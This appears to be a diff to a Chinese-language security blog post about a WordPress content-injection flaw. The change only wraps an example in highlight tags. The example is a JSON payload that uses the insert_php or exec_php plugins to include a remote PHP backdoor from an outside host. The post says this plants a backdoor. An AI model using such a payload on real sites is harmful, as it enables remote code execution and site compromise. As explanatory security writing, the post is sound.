@@ -297,9 +297,9 @@ Content-Length: 23
 如果存在漏洞的WordPress安装了如 <kbd>insert_php</kbd>,<kbd>exec_php</kbd>等允许页面执行PHP代码的插件，可以构造数据包上传
 
 
-
+{% highlight html %}
 content<spanclass="token punctuation">:</span>"<span class="tokenpunctuation">[</span>insert_php<span class="tokenpunctuation">]</span> <span class="tokenkeyword">include</span><span class="tokenpunctuation">(</span>'http<span class="tokenpunctuation">[</span><span class="tokenpunctuation">:</span><span class="tokencomment">]//acommeamour.fr/tmp/xx.php'); [/insert_php][php] include('http[:]//acommeamour.fr/tmp/xx.php'); [/php]","id":"61a"}  </span>
-
+{% endhighlight %}
 
 
 木马被插件当做PHP代码执行，导致植入后门。
